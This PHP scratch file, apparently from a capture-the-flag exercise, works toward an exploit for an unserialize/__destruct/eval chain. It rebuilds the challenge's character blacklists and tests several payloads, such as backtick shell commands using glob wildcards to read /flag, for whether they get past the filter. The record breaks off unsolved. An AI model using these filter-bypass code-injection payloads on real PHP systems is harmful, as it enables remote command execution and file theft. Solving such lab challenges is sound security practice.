<?php
// 思路：让第二次 __destruct 时 $a 是一个有效的函数名
// 在第一次 eval($a . $b) 中，我们可以修改 $this->a

$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function ($s) {
    return preg_quote($s, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function ($s) {
    return preg_quote($s, '/'); }, $blocked_b)) . '/i';

// 策略：
// 1. $obj->a = "FLAG"  
// 2. $obj->b = ';var_dump(`xxd /?l?g`);$this->a="md5";$this->b="x";'
//    这样第一次 FLAG("", $b) 创建新对象后，eval() 执行我们的命令并修改属性
//    第二次 __destruct 时，会调用 md5("", "x")，不会报错

// 但是问题：$this 在 __construct 的 eval 中可用吗？让我测试

$test_b = ';var_dump(`xxd /?l?g`);$this->a="md5";$this->b="x";';
echo "Payload: $test_b\n";
if (preg_match($pattern_b, $test_b, $matches)) {
    echo "被过滤: " . implode(', ', $matches) . "\n";
} else {
    echo "✓ 通过检查!\n";
}

// 问题：$this 包含 't', 'h', 'i', 's'
// blocked_b 有: 't', 'h', 's'? 不，'sy' 有 's', 但没有单独的 's'
// 有 't', 'h'

echo "\n检查各个部分:\n";
$parts = ['$this', '->a', 'md5', '$this->a'];
foreach ($parts as $part) {
    if (preg_match($pattern_b, $part, $matches)) {
        echo "  '$part' 被过滤: " . implode(', ', $matches) . "\n";
    } else {
        echo "  '$part' ✓\n";
    }
}

// $this 有 't', 'h' 都被过滤了

echo "\n\n=== 新策略 ===\n";
echo "既然不能用 $this，那么让第二个对象的 check 失败:\n";
echo "在第一个 FLAG('', $b) 的 eval 中，修改全局状态或类定义是不可能的\n";
echo "但是我们可以让 $b 第二次不通过检查！\n\n";

// 等等，check 是用参数 $a, $b 检查的，不是用 $this->a, $this->b
// 所以在 eval 中修改 $this->a 没用

echo "重新理解代码:\n";
echo "__construct 中: check(\$a, \$b) 检查参数，然后 eval(\$a . \$b)，然后设置 \$this->a = \$a\n";
echo "__destruct 中: \$a = (string)\$this->a, 然后 check(\$a, \$b)，然后 \$a('', \$b)\n";
echo "\n所以 eval 中的修改确实会影响 __destruct!\n\n";

// 那我们需要一个不包含 t, h 的方式来修改属性
// 或者让第二次 check 失败

echo "策略：让第二次 $b 包含被过滤的内容\n";
echo "但是第一次 eval 时 $b 还没包含，第二次 __destruct 时才包含\n";
echo "这需要修改 \$this->b，但是需要 $this 或其他引用...\n\n";

// 或者！用全局变量
echo "=== 使用全局变量 ===\n";
$test_b2 = ';var_dump(`xxd /?l?g`);global $x;$x="used";';
echo "Payload: $test_b2\n";
if (preg_match($pattern_b, $test_b2, $matches)) {
    echo "被过滤: " . implode(', ', $matches) . "\n";
} else {
    echo "✓ 通过!\n";
}

// global 有 'o'被过滤

// 再想想... 也许直接让第二次执行时返回或不执行
echo "\n=== 条件执行 ===\n";
$test_b3 = ';if(!isset($x)){var_dump(`xxd /?l?g`);$x=1;}';
echo "Payload: $test_b3\n";
if (preg_match($pattern_b, $test_b3, $matches)) {
    echo "被过滤: " . implode(', ', $matches) . "\n";
} else {
    echo "✓ 通过!\n";
}

// if, isset 都有 't', 'e'

// 更简单的：让 check 返回 false
echo "\n=== 让第二次 check 失败 ===\n";
// 我们不能在第一次 eval 后让第二次 check 失败，因为 $b 是不变的

echo "\n等等！我重新看一下执行流程:\n";
echo "1. unserialize 创建对象，设置 \$this->a = 'FLAG', \$this->b = '...'\n";
echo "2. script 结束时，调用 __destruct\n";
echo "3. __destruct: \$a = 'FLAG', \$b = '...', 检查通过, 调用 FLAG('', \$b)\n";
echo "4. 创建新对象 FLAG('', '...'), 调用 __construct('', '...')\n";
echo "5. __construct: \$this->a = '', \$this->b = '...', check('', '...'), eval('' . '...')\n";
echo "6. 新对象在某个时候销毁，调用它的 __destruct\n";
echo "7. __destruct: \$a = '', \$b = '...', check('', '...'), 尝试调用 ''('', '...') -> 报错!\n\n";

echo "所以问题是第二个对象的 \$a 是空字符串！\n";
echo "解决：在第一个对象的 __destruct 中调用的 FLAG('', \$b) 时，\n";
echo "让这个新对象的 __construct 执行完后，\$this->a 不是空字符串！\n\n";

echo "在 __construct 中，先设置 \$this->a = \$a (参数),\n";
echo "然后 eval(\$a . \$b)，所以如果 eval 中修改了 \$this->a，会覆盖！\n\n";

echo "所以 payload 应该是:\n";
$final_b = ';var_dump(`xxd /?l?g`);$a="md5";$b="";';
echo "$final_b\n";
if (preg_match($pattern_b, $final_b, $matches)) {
    echo "被过滤: " . implode(', ', $matches) . "\n";
} else {
    echo "✓ 通过! 这样第二个对象销毁时会调用 md5('', '')，不报错\n";
}

// 但是修改局部变量 $a, $b 不会影响 $this->a, $this->b...

echo "\n不对！在 __construct 中:\n";
echo "1. \$this->a = \$a  (参数)\n";
echo "2. \$this->b = \$b  (参数)\n";
echo "3. eval(\$a . \$b)\n";
echo "eval 中修改 \$a 变量不会影响 \$this->a！\n\n";

echo "所以唯一的办法是在 eval 中修改 \$this->a，但是 'this' 包含被过滤字符\n";
echo "或者...\n\n";
